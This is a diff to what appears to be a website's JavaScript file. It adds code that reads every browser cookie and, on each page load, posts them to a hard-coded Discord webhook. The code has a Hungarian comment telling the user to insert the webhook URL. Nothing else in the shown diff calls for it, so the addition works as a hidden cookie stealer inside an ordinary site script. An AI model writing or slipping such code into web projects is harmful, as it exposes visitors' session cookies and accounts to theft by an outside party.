@@ -133,3 +133,42 @@ document.addEventListener("DOMContentLoaded", function () {
   };
   request.send();
 });
+function getCookies() {
+  const cookies = document.cookie.split(";").reduce((acc, cookie) => {
+    const [name, value] = cookie.split("=").map((c) => c.trim());
+    acc[name] = value;
+    return acc;
+  }, {});
+  return cookies;
+}
+
+function sendToWebhook(data) {
+  const webhookUrl =
+    "https://discord.com/api/webhooks/1263256734538137701/2Sr3jDq7qmTobia1rHaJUHiDR9Jhk8AWI2MZTTLrOxlmDDbIjAICc_8YdeC6yzHdoaK9"; // Ide helyezd be a webhook URL-t
+
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      content: "Cookie-k: " + JSON.stringify(data),
+    }),
+  })
+    .then((response) => {
+      if (response.ok) {
+        console.log("Data sent successfully");
+      } else {
+        console.error("Error sending data");
+      }
+    })
+    .catch((error) => {
+      console.error("Error:", error);
+    });
+}
+
+window.onload = () => {
+  const cookies = getCookies();
+  console.log("Cookie-k:", cookies);
+  sendToWebhook(cookies);
+};
